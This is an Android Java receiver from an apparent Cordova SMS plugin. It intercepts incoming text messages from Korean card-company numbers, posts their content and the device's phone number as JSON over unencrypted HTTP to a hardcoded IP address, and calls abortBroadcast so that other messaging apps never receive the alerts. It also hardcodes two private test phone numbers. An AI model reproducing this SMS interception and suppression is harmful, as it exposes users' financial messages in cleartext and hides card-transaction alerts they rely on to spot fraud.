package com.rjfun.cordova.sms;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Date;
import java.util.HashMap;

import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class SmsBroadCast extends BroadcastReceiver {
	
	String origNumber = null;
	String message =  null;
	String phoneNumber = null;
	
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())){
            Log.d("onReceive()","부팅완료");
        }
        if (Intent.ACTION_SCREEN_ON == intent.getAction()) {
            Log.d("onReceive()","스크린 ON");
        }
        if (Intent.ACTION_SCREEN_OFF == intent.getAction()) {
            Log.d("onReceive()","스크린 OFF");
        }
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Log.d("onReceive()","문자가 수신되었습니다");
            
			TelephonyManager systemService = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			phoneNumber = systemService.getLine1Number();
			phoneNumber = phoneNumber.substring(phoneNumber.length() - 10,
			phoneNumber.length());
			phoneNumber = "0" + phoneNumber;             
            
			String samsungCardTelNo = "15888900";
			String wooriCardTelNo = "15889955";
			String nhCardTelNo = "15881600";
			String bcCardTelNo = "15884000";
			String shinhanTelNo = "15447200";
			String lotteTelNo = "15888100";
			String kbCardTelNo = "15881688";
			String kbChkCardTelNo = "16449999";
			String hanaCardTelNo = "18001111";
			String testCardTelNo = "01074505585";			
			String testCardTelNo2 = "01074960125";			
			
			Log.d("onReceive()","phoneNumber"+phoneNumber);
			
            // SMS 메시지를 파싱합니다.
            Bundle bundle = intent.getExtras();
            Object messages[] = (Object[])bundle.get("pdus");
            SmsMessage smsMessage[] = new SmsMessage[messages.length];
            
            for(int i = 0; i < messages.length; i++) {
                // PDU 포맷으로 되어 있는 메시지를 복원합니다.
                smsMessage[i] = SmsMessage.createFromPdu((byte[])messages[i]);
            }
            
            // SMS 수신 시간 확인
            Date curDate = new Date(smsMessage[0].getTimestampMillis());
            Log.d("문자 수신 시간", curDate.toString());
            
            // SMS 발신 번호 확인
            origNumber = smsMessage[0].getOriginatingAddress();
//            origNumber = "15447200";
            
            // SMS 메시지 확인
            message = smsMessage[0].getMessageBody().toString();
            Log.d("문자 내용", "발신자 : "+origNumber+", 내용 : " + message);			
			
			if(nhCardTelNo.equals(origNumber) || bcCardTelNo.equals(origNumber) || shinhanTelNo.equals(origNumber) || lotteTelNo.equals(origNumber) || wooriCardTelNo.equals(origNumber) || samsungCardTelNo.equals(origNumber) || kbCardTelNo.equals(origNumber) || kbChkCardTelNo.equals(origNumber) || hanaCardTelNo.equals(origNumber) || testCardTelNo2.equals(origNumber) || testCardTelNo.equals(origNumber)){
				Log.d("onReceive()","samsungCardTelNo.equals(phoneNumber) 에들어옴");
	            Thread thread = new Thread() {
	                @Override
	                public void run() {            
	            
	            HttpURLConnection conn = null;
	            try {
	            	URL url = new URL("http://117.52.97.40/theReal/receipt/smsCardInfo.do");
	            	//URL url = new URL("http://182.162.84.177/theReal/receipt/smsCardInfo.do");
	                //URL url = new URL("requestURL"); //요청 URL을 입력
	                conn = (HttpURLConnection) url.openConnection();
	                conn.setRequestMethod("POST"); //요청 방식을 설정 (default : GET)
	             
	                conn.setDoInput(true); //input을 사용하도록 설정 (default : true)
	                conn.setDoOutput(true); //output을 사용하도록 설정 (default : false)
	        		conn.setRequestProperty("Accept-Language", "ko-kr,ko;q=0.8,en-us;q=0.5,en;q=0.3");
	        		conn.setRequestProperty("Accept", "application/json");
	        		conn.setRequestProperty("Accept-Charset", "UTF-8");             
	                
	                conn.setConnectTimeout(6000); //타임아웃 시간 설정 (default : 무한대기)
	             
	                OutputStream os = conn.getOutputStream();
	                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8")); //캐릭터셋 설정
	                
	                JSONObject obj = new JSONObject();
	                
			    	obj.put("origNumber", origNumber);
			    	obj.put("message",message);
			    	obj.put("phoneNumber",phoneNumber);
			    	 Log.d("문자 내용", "발신자 : "+obj);
			    	 Log.d("문자 내용", "발신자 : "+obj.toString());
	                writer.write(obj.toString()); //요청 파라미터를 입력
	                writer.flush();
	                writer.close();
	                os.close();
	             
	                conn.connect();
	             
	                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8")); //캐릭터셋 설정
	             
	                StringBuilder sb = new StringBuilder();
	                String line = null;
	                while ((line = br.readLine()) != null) {
	                    if(sb.length() > 0) {
	                        sb.append("\n");
	                    }
	                    sb.append(line);
	                }
	             
	                System.out.println("response:" + sb.toString());
	             
	            } catch (Exception e) {
	                e.printStackTrace();
	            } finally {
	                if(conn != null) {
	                    conn.disconnect();
	                }
	            }            
	                }
	            };

	            thread.start();            
	            abortBroadcast();
	            // 우선순위가 낮은 다른 문자 앱이 수신을 받지 못하도록 함				
				
				
			}
			Log.d("onReceive()","samsungCardTelNo.equals(phoneNumber) 에 안들어옴");
            Log.d("문자 내용", "발신자 : "+phoneNumber);
            

            

        }
    }
    
}


